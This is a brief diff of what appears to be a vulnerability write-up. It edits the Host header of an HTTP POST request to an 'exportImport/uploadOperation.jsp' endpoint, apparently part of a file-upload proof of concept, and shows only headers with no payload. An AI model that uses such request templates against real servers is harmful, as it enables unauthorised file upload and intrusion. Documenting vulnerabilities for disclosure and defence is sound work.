@@ -18,7 +18,7 @@
 
 ```bash
 POST /page/exportImport/uploadOperation.jsp HTTP/1.1
-Host: xxx.xxx.xxx.xxx
+Host: 
 Content-Length: 397
 Pragma: no-cache
 Cache-Control: no-cache
